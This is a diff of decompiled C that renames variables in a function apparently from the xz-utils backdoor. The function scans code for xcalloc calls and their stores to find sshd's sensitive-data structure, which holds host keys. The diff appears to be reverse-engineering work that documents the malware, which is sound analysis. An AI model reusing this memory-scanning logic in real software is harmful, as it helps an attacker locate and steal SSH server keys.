@@ -19,118 +19,109 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
                string_references_t *string_refs,void **sensitive_data_out)
 
 {
-  u8 *call_target;
+  u8 *xcalloc_call_target;
   byte bVar1;
   BOOL BVar2;
   long lVar3;
   long lVar4;
   long lVar5;
   long *plVar6;
-  undefined4 *puVar7;
-  u8 *puVar8;
-  ulong uVar9;
-  byte bVar10;
-  byte bVar11;
-  u64 store_candidates [16];
-  dasm_ctx_t store_probe_ctx;
-  dasm_ctx_t insn_ctx;
-  long store_hits [16];
-  u8 *xcalloc_call_target;
+  dasm_ctx_t *pdVar7;
   u8 *store_operand_ptr;
-  undefined1 local_100 [27];
+  ulong uVar9;
   u8 hit_count;
-  u32 modrm_snapshot;
-  u8 rex_rm_bits;
-  u8 *local_d0;
-  long local_a8 [16];
+  u8 tracked_reg;
+  dasm_ctx_t store_probe_ctx;
+  long store_hits[16];
   
   *sensitive_data_out = (void *)0x0;
-  call_target = (u8 *)string_refs->entries[0].func_start;
-  if (call_target == (u8 *)0x0) {
+  xcalloc_call_target = (u8 *)string_refs->entries[0].func_start;
+  if (xcalloc_call_target == (u8 *)0x0) {
     return FALSE;
   }
-  bVar11 = 0xff;
-  puVar8 = (u8 *)0x0;
-  bVar10 = 0;
-  plVar6 = local_a8;
+  tracked_reg = 0xff;
+  store_operand_ptr = (u8 *)0x0;
+  hit_count = 0;
+  plVar6 = store_hits;
   for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
     *(undefined4 *)plVar6 = 0;
     plVar6 = (long *)((long)plVar6 + 4);
   }
-  puVar7 = (undefined4 *)local_100;
+  pdVar7 = &store_probe_ctx;
   for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
-    *puVar7 = 0;
-    puVar7 = puVar7 + 1;
+    *(undefined4 *)&pdVar7->instruction = 0;
+    pdVar7 = (dasm_ctx_t *)((long)&pdVar7->instruction + 4);
   }
 LAB_001036eb:
   do {
     if ((code_end <= code_start) ||
-       (BVar2 = find_call_instruction(code_start,code_end,call_target,(dasm_ctx_t *)local_100),
-       BVar2 == FALSE)) goto LAB_00103802;
-    code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
+       (BVar2 = find_call_instruction(code_start,code_end,xcalloc_call_target,&store_probe_ctx), BVar2 == FALSE))
+    goto LAB_00103802;
+    code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
     BVar2 = find_instruction_with_mem_operand_ex
-                      (code_start,code_start + 0x20,(dasm_ctx_t *)local_100,0x109,(void *)0x0);
+                      (code_start,code_start + 0x20,&store_probe_ctx,0x109,(void *)0x0);
   } while (BVar2 == FALSE);
-  if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1040) == 0) {
+  if ((store_probe_ctx.prefix.flags_u16 & 0x1040) == 0) {
 LAB_00103788:
-    if (bVar11 != 0) {
-      code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
+    if (tracked_reg != 0) {
+      code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
       goto LAB_001036eb;
     }
   }
   else {
-    if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x40) != 0) {
-      bVar11 = modrm_snapshot._2_1_;
-      if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
-        bVar1 = hit_count * '\x02';
+    if ((store_probe_ctx.prefix.flags_u16 & 0x40) != 0) {
+      tracked_reg = store_probe_ctx.prefix._14_1_;
+      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
+        bVar1 = (char)store_probe_ctx.prefix.decoded.rex * '\x02';
 LAB_00103782:
-        bVar11 = bVar11 | bVar1 & 8;
+        tracked_reg = tracked_reg | bVar1 & 8;
       }
       goto LAB_00103788;
     }
-    if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1000) != 0) {
-      bVar11 = rex_rm_bits;
-      if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
-        bVar1 = hit_count << 3;
+    if ((store_probe_ctx.prefix.flags_u16 & 0x1000) != 0) {
+      tracked_reg = store_probe_ctx.imm64_reg;
+      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
+        bVar1 = (char)store_probe_ctx.prefix.decoded.rex << 3;
         goto LAB_00103782;
       }
       goto LAB_00103788;
     }
   }
-  if (((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x100) != 0) &&
-     (puVar8 = local_d0, (modrm_snapshot & 0xff00ff00) == 0x5000000)) {
-    puVar8 = local_d0 + ((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size;
+  if (((store_probe_ctx.prefix.flags_u16 & 0x100) != 0) &&
+     (store_operand_ptr = (u8 *)store_probe_ctx.mem_disp,
+     ((uint)store_probe_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
+    store_operand_ptr = (u8 *)(store_probe_ctx.mem_disp + (long)store_probe_ctx.instruction) + store_probe_ctx.instruction_size;
   }
-  if ((data_start <= puVar8) && (puVar8 < data_end)) {
-    uVar9 = (ulong)bVar10;
-    bVar10 = bVar10 + 1;
-    local_a8[uVar9] = (long)puVar8;
-    if (0xf < bVar10) {
+  if ((data_start <= store_operand_ptr) && (store_operand_ptr < data_end)) {
+    uVar9 = (ulong)hit_count;
+    hit_count = hit_count + 1;
+    store_hits[uVar9] = (long)store_operand_ptr;
+    if (0xf < hit_count) {
 LAB_00103802:
       lVar3 = 0;
       do {
-        if ((uint)bVar10 <= (uint)lVar3) {
+        if ((uint)hit_count <= (uint)lVar3) {
           return FALSE;
         }
         lVar4 = 0;
         do {
           lVar5 = 0;
           do {
-            if (((void *)local_a8[lVar3] == (void *)(local_a8[lVar4] + -8)) &&
-               (local_a8[lVar4] == local_a8[lVar5] + -8)) {
-              *sensitive_data_out = (void *)local_a8[lVar3];
+            if (((void *)store_hits[lVar3] == (void *)(store_hits[lVar4] + -8)) &&
+               (store_hits[lVar4] == store_hits[lVar5] + -8)) {
+              *sensitive_data_out = (void *)store_hits[lVar3];
               return TRUE;
             }
             lVar5 = lVar5 + 1;
-          } while ((uint)lVar5 < (uint)bVar10);
+          } while ((uint)lVar5 < (uint)hit_count);
           lVar4 = lVar4 + 1;
-        } while ((uint)lVar4 < (uint)bVar10);
+        } while ((uint)lVar4 < (uint)hit_count);
         lVar3 = lVar3 + 1;
       } while( TRUE );
     }
   }
-  bVar11 = 0;
-  code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
+  tracked_reg = 0;
+  code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
   goto LAB_001036eb;
 }
 
